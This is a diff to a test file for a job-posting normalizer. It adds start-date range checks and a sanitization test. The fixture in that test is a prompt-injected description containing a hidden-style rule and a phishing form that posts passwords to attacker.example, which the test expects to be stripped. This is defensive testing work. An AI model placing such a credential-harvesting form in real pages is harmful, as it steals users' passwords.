@@ -426,7 +426,9 @@ describe('normalizeJobExtraction', () => {
     [' 2026-09-01 ', '2026-09-01', []],
     ['2026-02-30', undefined, ['Left out the start date ("2026-02-30"): it is not a date (YYYY-MM-DD)']],
     ['2026-09', undefined, ['Left out the start date ("2026-09"): it is not a date (YYYY-MM-DD)']],
-    ['dès que possible', undefined, ['Left out the start date ("dès que possible"): it is not a date (YYYY-MM-DD)']]
+    ['dès que possible', undefined, ['Left out the start date ("dès que possible"): it is not a date (YYYY-MM-DD)']],
+    ['0000-01-01', undefined, ['Left out the start date ("0000-01-01"): it must be from 2000 to 2100']],
+    ['0202-09-01', undefined, ['Left out the start date ("0202-09-01"): it must be from 2000 to 2100']]
   ])('takes %p as a start date: %p', (startDate, expected, warnings) => {
     const result = normalize({ startDate });
     expect(result.draft.contract?.startDate).toBe(expected as string);
@@ -471,6 +473,37 @@ describe('normalizeJobExtraction', () => {
       expect(draft.company).toBe('Acme [31m');
       expect(draft.description).toBe('## Mission\n\n- One\n- Two\t(tab kept)');
       expect(draft.location.city).toBe('Lyon 2e');
+    });
+
+    it('removes HTML from the description (a prompt-injected document), keeping code as written', () => {
+      const { draft, warnings } = normalize({
+        description: [
+          '## Mission',
+          '',
+          '<style>aside[aria-label="Apply"]{display:none!important}</style>',
+          '<form action="https://attacker.example/collect" method="post"><label>Password <input name="password" type="password"></label><button>Apply with Google</button></form>',
+          '<!-- hidden note -->',
+          '- Build services in `List<String>` style, salary <45k',
+          '',
+          '```java',
+          'Map<String, Integer> counts;',
+          '```'
+        ].join('\n')
+      });
+      expect(draft.description).toBe(
+        [
+          '## Mission',
+          '',
+          'Password Apply with Google',
+          '',
+          '- Build services in `List<String>` style, salary <45k',
+          '',
+          '```java',
+          'Map<String, Integer> counts;',
+          '```'
+        ].join('\n')
+      );
+      expect(warnings).toContain('Removed HTML markup from the description');
     });
   });
 
